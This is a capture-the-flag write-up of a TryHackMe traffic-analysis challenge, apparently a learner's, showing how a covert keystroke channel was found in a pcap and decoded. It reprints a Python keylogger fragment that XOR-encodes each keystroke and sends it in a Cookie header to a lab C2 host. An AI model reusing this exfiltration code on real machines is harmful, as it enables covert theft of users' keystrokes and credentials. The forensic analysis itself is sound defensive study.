# Day 04
- **Challenge name:** [Packed Light](https://tryhackme.com/room/hh-packedlight-02e5330c)
- **Category:** Network Forensics / Traffic Analysis
- **Difficulty:** Easy
- **Date completed:** 30th of July 2026

## Summary
This challenge hands you a short pcap capture from the Byte Lotus guest network and a cryptic tip from **@0xMia**: her laptop keeps pinging some random address on port 8080 every second "like clockwork," and the request headers are "giving 'not a real app.'" The task is to find the covert channel, figure out where data is being smuggled, reassemble it, and decode it into a flag.

## Exploitation / Walkthrough
### Step 1
Using my personal PC, I downloaded the pcap and opened it in Wireshark. Since @0xMia mentioned port 8080 specifically, I applied an `http` filter to narrow things down to just the relevant traffic.

### Step 2
While browsing the HTTP requests, I sorted by the **Length** column and looked for the biggest one - usually a good sign there's more going on than a normal request/response. That led me to a response with a `Content-type: text/x-python`, which turned out to be a `GET /temp/updates.py` request returning the full source code of a Python script being served from the same host:

<img width="1405" height="525" alt="image" src="https://github.com/user-attachments/assets/43cb43c9-a4e4-4693-a933-de4f479b271b" />


```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass
```

This was basically a keylogger. Every keypress gets XOR'd with a key, base64-encoded, then sent out inside a `Cookie` header (`hotel_sess_state`) on a GET request to the C2 server's root path - which explains @0xMia's "pings every second" and the suspicious `ByteLotusClient/1.1` User-Agent she noticed.

### Step 3
With the mechanism known, the next job was pulling the actual beacon traffic (not the `/temp/updates.py` request, but the repeated `GET /` requests to `byte-lotus-hotel.thm:8080`) and extracting the `Cookie` value from each one, in order.

I tried this two ways - a table comparison since both methods get you to the same place, just differently:

| | Method 1: Custom Column (GUI) | Method 2: TShark (CLI) |
|---|---|---|
| **How** | Right-click the `Cookie` header field in the packet details pane → **Apply as Column**. Then filter on `http.request`, sort by time, and read the new column straight down the packet list. | Run a single tshark command that pulls the `Cookie` header from every matching packet directly to the terminal, already in order. |
| **Speed** | A bit more manual, but quick enough once the column is set up. | Fastest option by far - one command, done. |

---

<img width="1047" height="598" alt="image" src="https://github.com/user-attachments/assets/dce9690d-15ca-4273-842e-92bc9fcdfa1c" />

---

TShark command used:
```bash
tshark -r capture.pcap -Y "http.request" -T fields -e http.cookie
```
Note: `capture.pcap` needs to be swapped out for the actual path to your pcapng file - wherever you saved/extracted it on your machine.

---
<img width="1191" height="537" alt="image" src="https://github.com/user-attachments/assets/dd86a2e1-6a28-45a3-8985-fbd6ea32c096" />

---

Once collected, I had a list of 30 base64 strings, one per keystroke:
```
HA==
AA==
BQ==
Mw==
Hg==
ew==
Og==
fA==
Fw==
eQ==
Ow==
Fw==
Pw==
fA==
PA==
Kw==
IA==
eQ==
Jg==
Lw==
Fw==
eA==
Pg==
LQ==
Gg==
Fw==
MQ==
eA==
PQ==
NQ==
```

### Step 4
To decode, I needed to reverse the script's process: base64-decode, then XOR with the same key. The question was which part of the key to actually use.

Normally XOR encryption cycles through a whole key, letter by letter, as it encrypts a long message. But this script doesn't work on a full message - it calls `sendltr()` once per keypress, encrypting just one single character at a time. Since the "message" being encrypted is always only 1 character long, the XOR function never gets far enough to move past the first letter of the key. So in practice, every single keystroke ends up XOR'd with just the *first* letter of the key, over and over.

The full key is `p1 + p2` = `H0t3lSt@ff0NlyK3epS3cr3t!` - as per Python's keylogger code above, so the first letter - and the one actually used - is `H`.

### Step 5
Ran the 30 cookie values through [CyberChef](https://gchq.github.io/CyberChef/) with the following recipe:
1. **From Base64** - standard alphabet
2. **XOR** - key `H`, key type Latin1/UTF8, standard scheme

---

<img width="2050" height="772" alt="image" src="https://github.com/user-attachments/assets/fc1f47a6-b22f-4e6f-9f60-96fd1619ac55" />

---

And voilà, there you have it!

## Tools Used
- Wireshark
- TShark
- CyberChef

## Flag
![redacted](https://img.shields.io/badge/-REDACTED-000000) - to avoid spoilers, correct flag will be posted after the event is concluded.

## Lessons Learned
Malicious traffic doesn't have to look scary - it can just be a normal-looking `Cookie` header on a normal-looking GET request. The stuff that gave it away was the pattern, not the content: same host, same port, firing off every second like clockwork.

Also, if a server hands you source code, read it. It saved me from having to reverse-engineer the encryption blind - the script basically explained itself.
